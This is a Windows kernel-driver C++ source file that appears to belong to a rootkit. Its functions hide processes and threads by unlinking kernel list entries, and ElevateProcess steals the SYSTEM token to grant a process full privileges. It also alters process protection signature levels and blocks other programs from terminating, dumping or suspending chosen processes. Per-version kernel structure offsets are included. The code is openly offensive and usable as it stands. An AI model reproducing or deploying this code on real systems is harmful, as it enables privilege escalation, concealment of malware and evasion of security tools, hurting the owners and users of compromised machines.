#pragma once
#include "pch.h"

// Definitions.
#define SYSTEM_PROCESS_PID	  0x4
#define PROCESS_TERMINATE	  0x1
#define PROCESS_CREATE_THREAD 0x2
#define PROCESS_VM_READ		  0x10
#define PROCESS_VM_OPERATION  0x8

// Prototypes.
bool FindThread(ULONG tid);
bool AddThread(ULONG tid);
bool RemoveThread(ULONG tid);
ULONG GetThreadListEntryOffset();
ULONG GetThreadLockOffset();
bool FindProcess(ULONG pid);
bool AddProcess(ULONG pid);
bool RemoveProcess(ULONG pid);
ULONG GetActiveProcessLinksOffset();
ULONG GetProcessLockOffset();
bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid);
PLIST_ENTRY GetHiddenProcess(DWORD pid);
UINT64 GetTokenOffset();
NTSTATUS ElevateProcess(ULONG pid);
ULONG GetSignatureLevelOffset();
NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature);
void RemoveListLinks(PLIST_ENTRY current);
void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);

/*
* Description:
* OnPreOpenProcess is responsible for handling process access operations and remove certain permissions from protected processes.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as process name, handle to the process, process type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	if (pGlobals.ProtectedProcesses.PidsCount == 0)
		return OB_PREOP_SUCCESS;

	auto Process = (PEPROCESS)Info->Object;
	auto pid = HandleToULong(PsGetProcessId(Process));


	AutoLock locker(pGlobals.Lock);

	// If the process was found on the list, remove permissions for dump / write process memory and kill the process.
	if (FindProcess(pid)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_OPERATION;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_VM_READ;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_CREATE_THREAD;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_DUP_HANDLE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* OnPreOpenThread is responsible for handling thread access operations and remove certain permissions from protected threads.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as thread name, handle to the thread, thread type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	if (tGlobals.ProtectedThreads.TidsCount == 0)
		return OB_PREOP_SUCCESS;

	PETHREAD thread = (PETHREAD)Info->Object;
	ULONG tid = HandleToULong(PsGetThreadId(thread));
	ULONG ownerPid = HandleToULong(PsGetThreadProcessId(thread));
	ULONG callerPid = HandleToULong(PsGetCurrentProcessId());

	// To avoid a situation when a process dies and the thread needs to be closed but it isn't closed, if the killer is its owning process, let it be killed.
	if (callerPid == ownerPid || callerPid == SYSTEM_PROCESS_PID)
		return OB_PREOP_SUCCESS;


	AutoLock locker(tGlobals.Lock);

	// If the process was found on the list, remove permissions for terminating / setting context / suspending the thread.
	if (FindThread(tid)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SUSPEND_RESUME;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SET_CONTEXT;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* HideProcess is responsible for hiding a process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS HideProcess(ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
	AutoLock locker(pGlobals.Lock);
	ExAcquirePushLockExclusive(listLock);

	// Saving the hidden process' list entry for the future to release it.
	if (!AddHiddenProcess(processListEntry, pid)) {
		ExReleasePushLockExclusive(listLock);
		ObDereferenceObject(targetProcess);
		return STATUS_UNSUCCESSFUL;
	}

	RemoveListLinks(processListEntry);
	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);

	return status;
}

/*
* Description:
* UnhideProcess is responsible for unhiding a hidden process by modifying the process list.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to unhide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS UnhideProcess(ULONG pid) {
	PEPROCESS targetProcess;
	NTSTATUS status = STATUS_SUCCESS;
	PLIST_ENTRY entryToRestore;

	AutoLock locker(pGlobals.Lock);
	entryToRestore = GetHiddenProcess(pid);

	if (!entryToRestore)
		return STATUS_UNSUCCESSFUL;

	ULONG activeProcessLinkListOffset = GetActiveProcessLinksOffset();
	ULONG lockOffset = GetProcessLockOffset();

	if (activeProcessLinkListOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &targetProcess);

	if (!NT_SUCCESS(status))
		return status;

	PLIST_ENTRY processListEntry = (PLIST_ENTRY)((ULONG_PTR)targetProcess + activeProcessLinkListOffset);

	// Using the ActiveProcessLinks lock to avoid accessing problems.
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetProcess + lockOffset);
	ExAcquirePushLockExclusive(listLock);

	AddListLinks(entryToRestore, processListEntry);

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetProcess);
	entryToRestore = NULL;
	return status;
}

/*
* Description:
* HideThread is responsible for hiding a thread by modifying the entry thread list.
*
* Parameters:
* @tid	  [ULONG]	 -- TID to hide.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully hidden or not.
*/
NTSTATUS HideThread(ULONG tid) {
	PETHREAD targetThread;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG threadListEntryOffset = GetThreadListEntryOffset();
	ULONG lockOffset = GetThreadLockOffset();

	if (threadListEntryOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupThreadByThreadId(UlongToHandle(tid), &targetThread);

	if (!NT_SUCCESS(status))
		return status;

	// Using the ThreadListEntry lock to avoid accessing problems.
	PLIST_ENTRY threadListEntry = (PLIST_ENTRY)((ULONG_PTR)targetThread + threadListEntryOffset);
	PEX_PUSH_LOCK listLock = (PEX_PUSH_LOCK)((ULONG_PTR)targetThread + lockOffset);

	ExAcquirePushLockExclusive(listLock);
	RemoveListLinks(threadListEntry);
	ExReleasePushLockExclusive(listLock);

	ObDereferenceObject(targetThread);
	return status;
}

/*
* Description:
* ElevateProcess is responsible for stealing a token from the SYSTEM process and giving it to other process.
*
* Parameters:
* @pid	  [ULONG]	 -- PID to elevate.
*
* Returns:
* @status [NTSTATUS] -- Whether successfully elevated or not.
*/
NTSTATUS ElevateProcess(ULONG pid) {
	PEPROCESS privilegedProcess, targetProcess;
	NTSTATUS status = STATUS_SUCCESS;

	// Getting the EProcess of the target and the privileged processes.
	status = PsLookupProcessByProcessId(ULongToHandle(pid), &targetProcess);
	UINT64 tokenOffset = GetTokenOffset();

	if (!NT_SUCCESS(status))
		return status;

	status = PsLookupProcessByProcessId(ULongToHandle(SYSTEM_PROCESS_PID), &privilegedProcess);

	if (!NT_SUCCESS(status))
	{
		ObDereferenceObject(targetProcess);
		return status;
	}

	* (UINT64*)((UINT64)targetProcess + tokenOffset) = *(UINT64*)(UINT64(privilegedProcess) + tokenOffset);

	ObDereferenceObject(privilegedProcess);
	ObDereferenceObject(targetProcess);
	return status;
}

/*
* Description:
* AddHiddenProcess is responsible for adding a hidden process to the list of hidden processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool AddHiddenProcess(PLIST_ENTRY entry, DWORD pid) {
	for (int i = 0; i < MAX_PIDS; i++) {
		if (pGlobals.HiddenProcesses.Processes[i].Pid == 0) {
			pGlobals.HiddenProcesses.Processes[i].ListEntry = entry;
			pGlobals.HiddenProcesses.Processes[i].Pid = pid;
			pGlobals.HiddenProcesses.PidsCount++;
			return true;
		}
	}
	return false;
}

/*
* Description:
* GetHiddenProcess is responsible for searching if a process exists in the list of hidden processes.
*
* Parameters:
* @pid	  [ULONG]	    -- PID to search.
*
* Returns:
* @entry  [PLIST_ENTRY] -- If found, the process list entry.
*/
PLIST_ENTRY GetHiddenProcess(DWORD pid) {
	PLIST_ENTRY entry = NULL;

	for (int i = 0; i < pGlobals.HiddenProcesses.PidsCount; i++) {
		if (pGlobals.HiddenProcesses.Processes[i].Pid == pid) {
			entry = pGlobals.HiddenProcesses.Processes[i].ListEntry;
			pGlobals.HiddenProcesses.Processes[i].Pid = 0;
			pGlobals.HiddenProcesses.PidsCount--;
			break;
		}
	}
	return entry;
}

/*
* Description:
* FindProcess is responsible for searching if a process exists in the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
bool FindProcess(ULONG pid) {
	for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
		if (pGlobals.ProtectedProcesses.Processes[i] == pid)
			return true;
	return false;
}

/*
* Description:
* AddProcess is responsible for adding a process to the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool AddProcess(ULONG pid) {
	for (int i = 0; i < MAX_PIDS; i++)
		if (pGlobals.ProtectedProcesses.Processes[i] == 0) {
			pGlobals.ProtectedProcesses.Processes[i] = pid;
			pGlobals.ProtectedProcesses.PidsCount++;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveProcess is responsible for remove a process from the list of protected processes.
*
* Parameters:
* @pid	  [ULONG] -- PID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool RemoveProcess(ULONG pid) {
	for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++)
		if (pGlobals.ProtectedProcesses.Processes[i] == pid) {
			pGlobals.ProtectedProcesses.Processes[i] = 0;
			pGlobals.ProtectedProcesses.PidsCount--;
			return true;
		}
	return false;
}

/*
* Description:
* FindThread is responsible for searching if a thread exists in the list of protected threads.
*
* Parameters:
* @tid	  [ULONG] -- TID to search.
*
* Returns:
* @status [bool]  -- Whether found or not.
*/
bool FindThread(ULONG tid) {
	for (int i = 0; i < tGlobals.ProtectedThreads.TidsCount; i++)
		if (tGlobals.ProtectedThreads.Threads[i] == tid)
			return true;
	return false;
}

/*
* Description:
* AddThread is responsible for adding a thread to the list of protected threads.
*
* Parameters:
* @tid	  [ULONG] -- TID to add.
*
* Returns:
* @status [bool]  -- Whether successfully added or not.
*/
bool AddThread(ULONG tid) {
	for (int i = 0; i < MAX_TIDS; i++)
		if (tGlobals.ProtectedThreads.Threads[i] == 0) {
			tGlobals.ProtectedThreads.Threads[i] = tid;
			tGlobals.ProtectedThreads.TidsCount++;
			return true;
		}
	return false;
}

/*
* Description:
* RemoveThread is responsible for remove a thread from the list of protected threads.
*
* Parameters:
* @tid	  [ULONG] -- TID to remove.
*
* Returns:
* @status [bool]  -- Whether successfully removed or not.
*/
bool RemoveThread(ULONG tid) {
	for (int i = 0; i < tGlobals.ProtectedThreads.TidsCount; i++)
		if (tGlobals.ProtectedThreads.Threads[i] == tid) {
			tGlobals.ProtectedThreads.Threads[i] = 0;
			tGlobals.ProtectedThreads.TidsCount--;
			return true;
		}
	return false;
}

/*
* Description:
* GetActiveProcessLinksOffset is responsible for getting the active process link offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @activeProcessLinks [ULONG] -- Offset of active process links.
*/
ULONG GetActiveProcessLinksOffset() {
	ULONG activeProcessLinks = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1903:
		case WIN_1909:
			activeProcessLinks = 0x2f0;
			break;
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			activeProcessLinks = 0x2e8;
			break;
		default:
			activeProcessLinks = 0x448;
			break;
		}
	}

	return activeProcessLinks;
}


/*
* Description:
* GetProcessLockOffset is responsible for getting the ProcessLock offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @processLockOffset [ULONG] -- Offset of ProcessLock.
*/
ULONG GetProcessLockOffset() {
	ULONG processLockOffset = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			processLockOffset = 0x2d8;
			break;
		case WIN_1903:
		case WIN_1909:
			processLockOffset = 0x2e0;
			break;
		default:
			processLockOffset = 0x438;
			break;
		}
	}

	return processLockOffset;
}

/*
* Description:
* GetThreadListEntryOffset is responsible for getting the thread list entry offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @threadListEntry [ULONG] -- Offset of thread list entry.
*/
ULONG GetThreadListEntryOffset() {
	ULONG threadListEntry = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
			threadListEntry = 0x690;
			break;
		case WIN_1607:
			threadListEntry = 0x698;
			break;
		case WIN_1703:
			threadListEntry = 0x6a0;
			break;
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			threadListEntry = 0x6a8;
			break;
		case WIN_1903:
		case WIN_1909:
			threadListEntry = 0x6b8;
			break;
		case WIN_2004:
		case WIN_20H2:
		case WIN_21H1:
		case WIN_21H2:
			threadListEntry = 0x4e8;
			break;
		default:
			threadListEntry = 0x538;
			break;
		}
	}

	return threadListEntry;
}

/*
* Description:
* GetThreadLockOffset is responsible for getting the ThreadLock offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @threadLockOffset [ULONG] -- Offset of ProcessLock.
*/
ULONG GetThreadLockOffset() {
	ULONG threadLockOffset = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1507:
		case WIN_1511:
			threadLockOffset = 0x6a8;
			break;
		case WIN_1607:
			threadLockOffset = 0x6b0;
			break;
		case WIN_1703:
			threadLockOffset = 0x6b8;
			break;
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			threadLockOffset = 0x6c0;
			break;
		case WIN_1903:
		case WIN_1909:
			threadLockOffset = 0x6d0;
			break;
		case WIN_2004:
		case WIN_20H2:
		case WIN_21H1:
		case WIN_21H2:
			threadLockOffset = 0x500;
			break;
		default:
			threadLockOffset = 0x550;
			break;
		}
	}

	return threadLockOffset;
}

/*
* Description:
* RemoveListLinks is responsible for modifying the list by connecting the previous entry to the next entry and by
* that "removing" the current entry.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void RemoveListLinks(PLIST_ENTRY current) {
	PLIST_ENTRY previous;
	PLIST_ENTRY next;

	previous = current->Blink;
	next = current->Flink;

	previous->Flink = next;
	next->Blink = previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	current->Blink = (PLIST_ENTRY)&current->Flink;
	current->Flink = (PLIST_ENTRY)&current->Flink;
}

/*
* Description:
* AddListLinks is responsible for modifying the list by connecting an entry to specific target.
*
* Parameters:
* @current [PLIST_ENTRY] -- Current process entry.
*
* Returns:
* There is no return value.
*/
void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target) {
	PLIST_ENTRY next;

	next = target->Flink;

	current->Blink = target;
	current->Flink = next;

	next->Blink = current;
	target->Flink = current;
}

/*
* Description:
* GetTokenOffset is responsible for getting the main thread's token offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @tokenOffset [UINT64] -- Offset of the main thread's token.
*/
UINT64 GetTokenOffset() {
	UINT64 tokenOffset = (UINT64)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1903:
		case WIN_1909:
			tokenOffset = 0x360;
			break;
		case WIN_1507:
		case WIN_1511:
		case WIN_1607:
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			tokenOffset = 0x358;
			break;
		default:
			tokenOffset = 0x4b8;
			break;
		}
	}

	return tokenOffset;
}

/*
* Description:
* GetSignatureLevelOffset is responsible for getting the signature level offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @signatureLevelOffset [UINT64] -- Offset of the process' signature level.
*/
ULONG GetSignatureLevelOffset() {
	ULONG signatureLevelOffset = (ULONG)STATUS_UNSUCCESSFUL;
	RTL_OSVERSIONINFOW osVersion = { sizeof(osVersion) };
	NTSTATUS result = RtlGetVersion(&osVersion);

	if (NT_SUCCESS(result)) {
		switch (osVersion.dwBuildNumber) {
		case WIN_1903:
		case WIN_1909:
			signatureLevelOffset = 0x6f8;
			break;
		case WIN_1703:
		case WIN_1709:
		case WIN_1803:
		case WIN_1809:
			signatureLevelOffset = 0x6c8;
			break;
		case WIN_1607:
			signatureLevelOffset = 0x6c0;
			break;
		case WIN_1511:
			signatureLevelOffset = 0x6b0;
			break;
		case WIN_1507:
			signatureLevelOffset = 0x6a8;
			break;
		default:
			signatureLevelOffset = 0x878;
			break;
		}
	}

	return signatureLevelOffset;
}

/*
* Description:
* SetProcessSignature is responsible for removing or adding process protection to a certain process.
*
* Parameters:
* @pid	   [ULONG]    -- The id of the process that need to add or remove protection to.
* @protect [bool]     -- Whether to add or remove the protection.
*
* Returns:
* @status  [NTSTATUS] -- Whether the operation was successful or not.
*/
NTSTATUS SetProcessSignature(ProcessSignature* ProcessSignature) {
	PEPROCESS process;
	NTSTATUS status = STATUS_SUCCESS;

	status = PsLookupProcessByProcessId(ULongToHandle(ProcessSignature->Pid), &process);

	if (!NT_SUCCESS(status))
		return status;

	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
	PPROCESS_SIGNATURE processSignature = (PPROCESS_SIGNATURE)(UINT64(process) + GetSignatureLevelOffset());

	processSignature->SignatureLevel = newSignatureLevel;
	processSignature->Protection.Type = ProcessSignature->SignerType;
	processSignature->Protection.Signer = ProcessSignature->SignatureSigner;

	ObDereferenceObject(process);
	return status;
}
